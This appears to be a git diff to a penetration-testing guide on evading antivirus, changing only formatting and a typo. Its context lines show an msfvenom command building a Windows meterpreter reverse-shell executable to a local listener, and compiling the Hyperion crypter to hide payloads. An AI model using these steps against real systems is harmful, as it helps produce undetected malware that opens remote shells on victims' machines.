@@ -16,7 +16,7 @@ There are a few different techniques for doing this.
 
 ### Encoding
 
-We can encode our malware in different ways. This can be done with msfvenom. Notice how we set the **-e** flag here, and then use the shikata_ga_nai encoding. This is not that effective since antivirus-vendors have access to meteasploit as well.
+We can encode our malware in different ways. This can be done with msfvenom. Notice how we set the `-e` flag here, and then use the `shikata_ga_nai` encoding. This is not that effective since antivirus-vendors have access to metasploit as well.
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e
@@ -43,7 +43,7 @@ unzip Hyperion-1.2.zip
 i686-w64-mingw32-c++ Hyperion-1.2/Src/Crypter/*.cpp -o hyperion.exe
 ```
 
-In Kali you have hyperion 1 included. However for it to work you have to run it from it's correct path. So go to **/usr/share/veil-evasion/tools/hyperion**
+In Kali you have hyperion 1 included. However for it to work you have to run it from it's correct path. So go to `/usr/share/veil-evasion/tools/hyperion`
 
 And run it like this
 
